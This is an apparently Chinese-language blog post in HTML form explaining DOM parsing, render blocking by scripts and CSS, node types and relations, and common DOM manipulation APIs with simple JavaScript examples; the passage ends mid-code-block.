      <content type="html"><![CDATA[<h3 id="0-DOM"><a href="#0-DOM" class="headerlink" title="0. DOM"></a>0. DOM</h3><p>从网络传给渲染引擎的HTML文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。<em>DOM 是表述 HTML 的内部数据结构。</em></p><ul><li>从页面视角看，DOM是生成页面的基础数据结构</li><li>从 JavaScript 脚本视角来看，DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容</li><li>从安全视角来看，DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒之门外了。</li></ul><p><br></p><h4 id="DOM树如何生成？"><a href="#DOM树如何生成？" class="headerlink" title="DOM树如何生成？"></a><em>DOM树如何生成？</em></h4><p>在渲染引擎内部，有一个叫 <strong>HTML 解析器（HTMLParser</strong>）的模块，它的职责就是负责将 HTML 字节流转换为 DOM 结构。<br>具体的流程如下：</p><ul><li>网络进程接收到响应头后，如果<code>content-type是text/html</code>, 那么浏览器就会判断这是一个 HTML 类型的文件，然后为该请求选择或者创建一个渲染进程</li><li>渲染进程准备好之后，网络进程接收到数据后，将数据传递给渲染进程。渲染进程则把数据交给<strong>HTML解析器</strong>（ HTML 解析器并不是等整个文档加载完成之后再解析的，而是网络进程加载了多少数据，HTML 解析器便解析多少数据。）</li><li>通过分词器将字节流转换成Token<br><img src="/2018/10/07/DOM/6.jpg"></li><li>将Token解析为DOM节点，并将DOM节点添加到DOM树中<br><img src="/2018/10/07/DOM/7.jpg" style="width: 600px"></li></ul><p><br></p><h4 id="JS会阻塞DOM生成吗？-——-会"><a href="#JS会阻塞DOM生成吗？-——-会" class="headerlink" title="JS会阻塞DOM生成吗？ —— 会"></a><em>JS会阻塞DOM生成吗？</em> —— 会</h4><ul><li><p>解析到<em><code>内嵌&lt;script&gt;脚本</code></em>标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> div1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">      div1.innerText = <span class="string">'time.geekbang'</span></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>解析到<em><code>&lt;scirpt&gt;文件</code></em>时，执行流程还是一样的，会暂停整个DOM的解析，先下载这个JS文件，然后执行JS代码</p></li><li><p><em><code>async</code></em> 或 <em><code>defer</code></em> 来标记代码</p><ul><li><em><code>async</code></em> 一旦加载完成，会立即执行；</li><li><p><em><code>defer</code></em> 在 DOMContentLoaded 事件之前执行。</p><ul><li><em><code>onload</code></em> 页面上所有的DOM，样式表，脚本，图片，flash都已经加载完成了。</li><li><em><code>DOMContentLoaded</code></em> 仅DOM加载完成，不包括样式表，图片，flash。</li></ul></li></ul></li><li><p>预解析操作：当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。</p></li></ul><p><br></p><h4 id="CSS会阻塞DOM生成吗？-——-会"><a href="#CSS会阻塞DOM生成吗？-——-会" class="headerlink" title="CSS会阻塞DOM生成吗？ —— 会"></a><em>CSS会阻塞DOM生成吗？</em> —— 会</h4><p>JS代码出现了 <code>div1.style.color = ‘red&#39;</code> 的语句，它是用来操纵 CSSOM 的，所以在执行之前，需要先解析js语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行js之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">src</span>=<span class="string">'theme.css'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> div1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">      div1.innerText = <span class="string">'time.geekbang'</span> <span class="comment">//需要DOM</span></span></span><br><span class="line"><span class="javascript">      div1.style.color = <span class="string">'red'</span>  <span class="comment">//需要CSSOM</span></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="DOM什么时候渲染？"><a href="#DOM什么时候渲染？" class="headerlink" title="DOM什么时候渲染？"></a><em>DOM什么时候渲染？</em></h4><h4 id="为什么操作DOM很慢？"><a href="#为什么操作DOM很慢？" class="headerlink" title="为什么操作DOM很慢？"></a><em>为什么操作DOM很慢？</em></h4><p><br></p><h3 id="1-Node"><a href="#1-Node" class="headerlink" title="1. Node"></a>1. Node</h3><p>DOM是针对HTML和XML文档的一个API。DOM描述了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。每一段标记都可以通过树中的一个节点来表示。<br><img src="/2018/10/07/DOM/1.png" style="max-width:250px"></p><p><br></p><h4 id="1-1-节点类型"><a href="#1-1-节点类型" class="headerlink" title="1.1 节点类型"></a>1.1 节点类型</h4><p>JS中的所有节点类型都继承自Node类型，除了IE，其他浏览器都可以访问这个类型。每个节点都有一个<code>nodeType</code>属性，由12个数值常量来表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Node.ELEMENT_NODE           | 1</span><br><span class="line">Node.ATTRIBUTE_NODE         | 2</span><br><span class="line">Node.TEXT_NODE              | 3</span><br><span class="line">Node.CDATA_SECTION_NODE     | 4</span><br><span class="line">Node.ENTITY_REFERENCE_NODE  | 5</span><br><span class="line">Node.ENTITY_NODE            | 6</span><br><span class="line">Node.PROCESSING_INSTRUCTION_NODE | 7 </span><br><span class="line">Node.COMMENT_NODE           | 8</span><br><span class="line">Node.DOCUMENT_NODE          | 9</span><br><span class="line">Node.DOCUMENT_TYPE_NODE     | 10</span><br><span class="line">Node.DOCUMENT_FRAGMENT_NODE | 11</span><br><span class="line">Node.NOTATION_NODE          | 12</span><br></pre></td></tr></table></figure></p><p>要了解节点的信息，可以使用<code>nodeName</code>和<code>nodeValue</code>属性。</p><p><br></p><h4 id="1-2-节点关系"><a href="#1-2-节点关系" class="headerlink" title="1.2 节点关系"></a>1.2 节点关系</h4><p>每一个节点都有一个<code>childNodes</code>属性，其中保存着一个<code>NodeList</code>对象。<code>NodeList</code>是一种类数组对象，用于保存一组有序的节点，它实际上基于DOM结构动态执行查询的结果。DOM结构的变化能自动反映在<code>NodeList</code>对象中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">someNode.childNodes[0]      // 子节点</span><br><span class="line">someNode.childNodes.item(1)</span><br><span class="line">someNode.hasChildNodes()    // 是否有子节点</span><br><span class="line"></span><br><span class="line">someNode.parentNode         // 父节点</span><br><span class="line">someNode.previousSibling    // 前一个同胞节点</span><br><span class="line">someNode.nextSibling        // 后一个同胞节点</span><br><span class="line">someNode.fistChild == someNode.childNodes[0]  // 第一个子节点</span><br><span class="line">someNode.lastChild          // 最后一个子节点</span><br></pre></td></tr></table></figure></p><p><code>document.getElementById(&#39;myList&#39;).childNodes</code>,IE会任务<code>&lt;ul&gt;</code>有三个<code>&lt;li&gt;</code>子节点。其他浏览器会认为，<code>&lt;ul&gt;</code>有3个<code>&lt;li&gt;</code>元素和4个文本节点(li元素之间的空白符)。这意味着，如果需要通过childNodes遍历子节点时，要检查nodeType属性是否为1(元素节点)。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-3-操作节点"><a href="#1-3-操作节点" class="headerlink" title="1.3 操作节点"></a>1.3 操作节点</h4><ul><li><p><em>appendChild</em><br>用于向<code>childNodes</code>列表的末尾添加一个节点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">someNode.appendChild(newNode);</span><br><span class="line">console.log(someNode.lastChild = newNode) // true</span><br></pre></td></tr></table></figure></li><li><p><em>insertBefore</em><br>把节点放在<code>childNodes</code>列表中某个特定位置上。插入节点后，被插入的节点会变成参照节点的前一个同胞节点(previousSibling)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">someNode.insertBoefore(newNode, someNode.firstChild) // 插入后成为第一个节点</span><br><span class="line">someNode.insertBefore(newNode, someNode.lastChild) // 插入后成为倒数第二个节点</span><br></pre></td></tr></table></figure></li><li><p><em>replaceChild</em><br>将要替换的节点从文档树中移出，同时要插入的节点占据位置。要使用上面这几个方法必须先取得父节点<code>parentNode</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">someNode.replaceChild(newNode, someNode.firstChild) // 替换第一个节点</span><br></pre></td></tr></table></figure></li><li><p><em>removeChild</em><br>移除节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">someNode.removeChild(someNode.firstChild) // 移除第一个节点</span><br></pre></td></tr></table></figure></li><li><p><em>cloneNode</em><br>创建调用这个方法的节点的一个完全相同的副本，接受一个布尔值参数，表示是否执行深复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myList.cloneNode(true)  // 复制节点和整个子节点数</span><br><span class="line">myList.cloneNode(false) // 只复制节点本身</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="2-Document"><a href="#2-Document" class="headerlink" title="2. Document"></a>2. Document</h3><p><code>document</code>对象是<code>HTMLDocument</code>的一个实例，表示整个HTML页面。而且，document对象是window对象的属性，可以作为全局对象来访问。</p><p><br></p><h4 id="2-1-文档信息"><a href="#2-1-文档信息" class="headerlink" title="2.1 文档信息"></a>2.1 文档信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">document.documentElement // 指向&lt;html&gt;元素</span><br><span class="line">document.body     // 指向&lt;body&gt;元素</span><br><span class="line">document.title    // 文档标题</span><br><span class="line">document.URL      // 完整的url</span><br><span class="line">document.domain   // 域名</span><br><span class="line">document.referrer // 来源页面的URL</span><br><span class="line"></span><br><span class="line">document.title = &apos;首页&apos;</span><br><span class="line">document.domain = &apos;wrox.com&apos;</span><br><span class="line"></span><br><span class="line">document.anchors  // 文档中所有带name属性的&lt;a&gt;元素</span><br><span class="line">document.forms    // 文档中所有&lt;form&gt;元素</span><br><span class="line">document.images   // 文档中所有&lt;img&gt;元素</span><br><span class="line">document.links    // 文档中所有带href的&lt;a&gt;元素</span><br></pre></td></tr></table></figure><p><code>document.domain</code>是可以设置的，但由于安全限制，如果url中包含一个子域名，<code>p2p.wrox.com</code>可以把<code>domain</code>设置为<code>wrox.com</code>。当页面中包含来自其它子域的iframe时， 通过将每个页面的<code>document.domain</code>设置为相同的值，这些页面就可以互相访问对方包含的Javascript对象。</p><p><br></p><h4 id="2-2-查找元素"><a href="#2-2-查找元素" class="headerlink" title="2.2 查找元素"></a>2.2 查找元素</h4><ul><li><p><em>document.getElement</em><br>会返回一个<code>HTMLCollection</code>对象，该对象与<code>NodeList</code>非常相似。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById()</span><br><span class="line"></span><br><span class="line">document.getElementsByTagName()</span><br><span class="line">document.getElementsByTagName(&quot;*&quot;)</span><br><span class="line">document.getElementsByTagName(&apos;img&apos;)[0].src</span><br><span class="line"></span><br><span class="line">document.getElementsByName()  // 常见取得表单选项</span><br><span class="line">document.getElementsByName(&apos;color&apos;)</span><br><span class="line">&lt;input type=&quot;raido&quot; name=&quot;color&quot;&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&apos;list&apos;).getElementsByTagName(&apos;li&apos;)</span><br></pre></td></tr></table></figure></li><li><p><em>querySelector</em><br>接受一个CSS选择符，返回与该模式匹配的第一个元素，没有则返回null。<br>IE 8+, Firefox 3.5+, Safari 3.1+, Chrome和Opera 10+都支持<code>querySelector()和querySelectorAll()</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">"#myDiv"</span>);</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">".selected"</span>);</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">"img.button"</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>querySelectorAll</em><br>接受一个CSS选择符，返回一个NodeList实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docuemnt.getElementById(<span class="string">"myDiv"</span>).querySelectorAll(<span class="string">"em"</span>);</span><br><span class="line">docuemnt.querySelectorAll(<span class="string">".selected"</span>);</span><br><span class="line">docuemnt.querySelectorAll(<span class="string">"p strong"</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>根据关系查找元素</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">childElementCount      // 返回子元素的个数</span><br><span class="line">firstElementChild      // 指向第一个子元素</span><br><span class="line">lastELementChild       // 指向最后一个子元素</span><br><span class="line">previousElementSibling // 指向前一个同辈元素</span><br><span class="line">nextElementSibling     // 指向后一个同辈元素</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-5-文档写入"><a href="#2-5-文档写入" class="headerlink" title="2.5 文档写入"></a>2.5 文档写入</h4><p>将输出流写入到网页的能力: <code>write(), writeIn(), open(), close()</code>。如果在文档结束后再调用<code>document.write()</code>，那么输出的内容将会重写整个页面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;strong&gt;&quot; + (newDate()).toString() + &quot;&lt;/strong&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;script type=\&quot;text/javascript\&quot; src=\&quot;file.js\&quot;&gt;&quot; + &quot;&lt;\/script&gt;&quot;);</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-Element"><a href="#3-Element" class="headerlink" title="3. Element"></a>3. Element</h3><p>Element类型用于表现XML或HTML元素，提供了对元素标签名、子节点及特性的访问。</p><h4 id="3-1-HTML元素"><a href="#3-1-HTML元素" class="headerlink" title="3.1 HTML元素"></a>3.1 HTML元素</h4><ul><li><p>元素属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element.nodeType    // 元素类型</span><br><span class="line">element.nodeName    // 元素的标签名，也可以使用element.tagName</span><br><span class="line">element.nodeValue   // 元素的值</span><br><span class="line">element.parentNode  // 可能是Document或Element</span><br></pre></td></tr></table></figure></li><li><p>HTMLElement子元素<br>所有HTML元素都由HTMLElement类型表示，每种元素都有与之对应的特性和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 只列举少量</span><br><span class="line">HTMLAnchorElement, HTMLBRElement, HTMLButtonElement, HTMLTableColElement, </span><br><span class="line">HTMLDivElement,HTMLFormElement,  HTMLFrameElement, HTMLFrameSetElement, </span><br><span class="line">HTMLHeadingElement, HTMLHeadElement, HTMLImageElement, HTMLInputElement, </span><br><span class="line">HTMLLabelElement, HTMLLIElement, HTMLMetaElement, HTMLOListElement, </span><br><span class="line">HTMLOptionElement, HTMLParagraphElement, HTMLScriptElement, HTMLStyleElement,</span><br><span class="line">HTMLTableElement</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="3-2-元素特性"><a href="#3-2-元素特性" class="headerlink" title="3.2 元素特性"></a>3.2 元素特性</h4><ul><li><p>获取元素特性<br>开发人员经常直接使用元素的属性，只有在取自定义特性值的情况下，才会使用<code>getAttribute()</code>方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"myDiv"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"bd"</span> my_attr=<span class="string">"hello!"</span> style=<span class="string">"display:none"</span> onclick=<span class="string">"f()"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line">div.id                       <span class="comment">// "myDiv"</span></span><br><span class="line">div.className                <span class="comment">// "bd"</span></span><br><span class="line">div.style                    <span class="comment">// 返回一个对象</span></span><br><span class="line">div.onclick                  <span class="comment">// 返回一个JS函数 || null</span></span><br><span class="line">div.getAttribute(<span class="string">'id'</span>)       <span class="comment">// "myDiv"</span></span><br><span class="line">div.getAttribute(<span class="string">'class'</span>)    <span class="comment">// "bd"</span></span><br><span class="line">div.getAttribute(<span class="string">'my_attr'</span>)  <span class="comment">// "hello!"</span></span><br><span class="line">div.getAttribute(<span class="string">'style'</span>)    <span class="comment">// 返回的是CSS文本</span></span><br><span class="line">div.getAttribute(<span class="string">'onclick'</span>)  <span class="comment">// 返回相应代码的字符串</span></span><br></pre></td></tr></table></figure></li><li><p>设置/删除元素特性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.setAttribute(key, val)</span><br><span class="line">div[key] = val;  <span class="comment">// 自定义的属性不会生效</span></span><br><span class="line">div.removeAttribute(key)</span><br></pre></td></tr></table></figure></li><li><p>element.attributes<br>将DOM结构序列化为HTML字符串，遍历元素特性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; element.attributes.length; i++ )&#123;</span><br><span class="line">  <span class="keyword">var</span> key = element.attributes[i].nodeName;</span><br><span class="line">  <span class="keyword">var</span> val = element.attributes[i].nodeValue;</span><br><span class="line">  arr.push(key + <span class="string">'='</span> + val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="3-3-创建元素"><a href="#3-3-创建元素" class="headerlink" title="3.3 创建元素"></a>3.3 创建元素</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line"><span class="comment">// var div = document.createDocumentFragment();</span></span><br><span class="line"><span class="comment">// 文档片段不会被添加到文档树中</span></span><br><span class="line">div.id = <span class="string">"myDiv"</span>;</span><br><span class="line">div.className = <span class="string">"box"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建文本节点</span></span><br><span class="line"><span class="keyword">var</span> textNode1 = <span class="built_in">document</span>.createTextNode(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">var</span> textNode2 = <span class="built_in">document</span>.createTextNode(<span class="string">"!!!"</span>);</span><br><span class="line">div.appendChild(textNode1);</span><br><span class="line">div.appendChild(textNode2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// normalize()能将相邻文本节点合并</span></span><br><span class="line">div.normalize();  <span class="comment">// div.firstChild.nodeValue == "hello!!!"</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(div);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-4-文本节点"><a href="#3-4-文本节点" class="headerlink" title="3.4 文本节点"></a>3.4 文本节点</h4><p>Text节点具有以下特征</p><ul><li>nodeType = 3</li><li>nodeName = “#text”</li><li>nodeValue = 具体文本</li><li>parentNode是一个element，文本节点没有子节点</li></ul><p>通过<code>nodeValue</code>属性或<code>data</code>属性访问文本节点中包含的文本。</p><ul><li>appendData(text): 将text添加到节点的末尾</li><li>deleteData(offset, count): 从offset指定的位置开始删除count个字符</li><li>insertData(offset, text): 在offset指定的位置插入text</li><li>replaceData(offset, count, text): 用text替换offset+count为止的文本</li><li>splitText(offset): 从offset位置将当前文本节点分成两个文本节点</li><li>substringData(offset, count): 提取offset+count处的字符串</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改文本</span></span><br><span class="line">&lt;div&gt;hello!<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">div.firstChild.nodeValue = <span class="string">"Some other message"</span></span><br><span class="line">div.firstChild.nodeValue = <span class="string">"&lt;strong&gt;&lt;/strong&gt;"</span>  <span class="comment">// 会被转义</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-DOM操作技术"><a href="#4-DOM操作技术" class="headerlink" title="4. DOM操作技术"></a>4. DOM操作技术</h3><h4 id="4-1-动态添加js-css"><a href="#4-1-动态添加js-css" class="headerlink" title="4.1 动态添加js/css"></a>4.1 动态添加js/css</h4><ul><li>添加js<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.creatElement(<span class="string">'script'</span>);</span><br><span class="line">script.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">script.src = <span class="string">"client.js"</span>;</span><br><span class="line"><span class="comment">// script.text = "function sayHi()&#123; alert('hi'); &#125;"</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></li></ul><p>怎么知道脚本加载完成了？</p><ul><li>添加css<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span><br><span class="line">link.rel = <span class="string">"stylesheet"</span>;</span><br><span class="line">link.type = <span class="string">"text/css"</span>;</span><br><span class="line">link.href = <span class="string">"style.css"</span>;</span><br><span class="line"><span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">head.appendChild(link);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cssText</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.createElement(<span class="string">'style'</span>);</span><br><span class="line"><span class="keyword">var</span> css = <span class="string">"body&#123;background-color: red&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(style.styleSheet)&#123;</span><br><span class="line">    style.styleSheet.cssText = css;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    style.appendChild(<span class="built_in">document</span>.createTextNode(css));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(style);</span><br><span class="line"><span class="string">``</span><span class="string">` 